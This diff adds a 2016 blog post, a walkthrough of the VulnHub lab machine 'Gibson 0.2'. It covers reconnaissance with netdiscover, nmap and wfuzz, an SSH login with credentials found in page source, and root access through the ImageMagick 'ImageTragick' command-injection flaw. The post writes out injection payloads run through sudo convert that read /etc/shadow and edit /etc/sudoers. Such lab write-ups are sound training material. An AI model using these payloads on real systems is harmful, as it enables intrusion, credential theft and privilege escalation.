@@ -1,0 +1,122 @@
+---
+layout: post
+title: "Gibson:0.2"
+date: 2016-07-21 09:20:22 -0500
+comments: true
+categories: [vulhub,ImageMagick]
+---
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+
+
+###Vulnerability:
+[ImageMagick <= 6.9.3-9 / <= 7.0.1-0 - Multiple Vulnerabilities ](https://www.exploit-db.com/exploits/39767/)
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.79.0/24`
+
+{% img  /images/blog/vulhub/gibson/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.79.196 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.79.196 -p-`
+
+
+{% img  /images/blog/vulhub/gibson/Selection_002.png   [title manually exploit [alt text]] %}
+
+port 22 and 80 are opening.
+
+use wfuzz to scan
+
+```
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.196/FUZZ 2>/dev/null
+```
+
+Nothing cool come out.
+
+check the webpage, find a file `davinci.htm`. Double click it.
+
+{% img  /images/blog/vulhub/gibson/Selection_003.png   [title manually exploit [alt text]] %}
+
+Not useful
+
+{% img  /images/blog/vulhub/gibson/Selection_004.png   [title manually exploit [alt text]] %}
+
+check the souce code:
+
+{% img  /images/blog/vulhub/gibson/Selection_005.png   [title manually exploit [alt text]] %}
+
+Get a potential username/password `margo`:`god`.
+
+login ssh:
+
+{% img  /images/blog/vulhub/gibson/Selection_006.png   [title manually exploit [alt text]] %}
+
+get the shell.
+
+
+Now lets try to get root
+
+`sudo -l`
+
+{% img  /images/blog/vulhub/gibson/Selection_007.png   [title manually exploit [alt text]] %}
+
+try to execute this program
+
+{% img  /images/blog/vulhub/gibson/Selection_008.png   [title manually exploit [alt text]] %}
+
+ImageMagick ????
+
+
+`searchsploit ImageMagick`
+
+{% img  /images/blog/vulhub/gibson/Selection_009.png   [title manually exploit [alt text]] %}
+
+I used that exploit.
+
+`convert 'https://example.com"|ls "-la' out.png`
+
+{% img  /images/blog/vulhub/gibson/Selection_010.png   [title manually exploit [alt text]] %}
+
+works
+
+{% img  /images/blog/vulhub/gibson/Selection_011.png   [title manually exploit [alt text]] %}
+
+
+now try:
+
+`sudo convert 'https://example.com"|cat "/etc/shadow' out.png`
+
+{% img  /images/blog/vulhub/gibson/Selection_012.png   [title manually exploit [alt text]] %}
+
+now 
+
+modify the `/etc/sudoers`
+
+`sudo convert 'https://example.com"|vim "/etc/sudoers' out.png`
+
+{% img  /images/blog/vulhub/gibson/Selection_013.png   [title manually exploit [alt text]] %}
+
+save and quit.
+
+ssh to the box as margo,
+
+`sudo su`
+
+{% img  /images/blog/vulhub/gibson/Selection_014.png   [title manually exploit [alt text]] %}
+
+
+Game Over
+
+
+
+
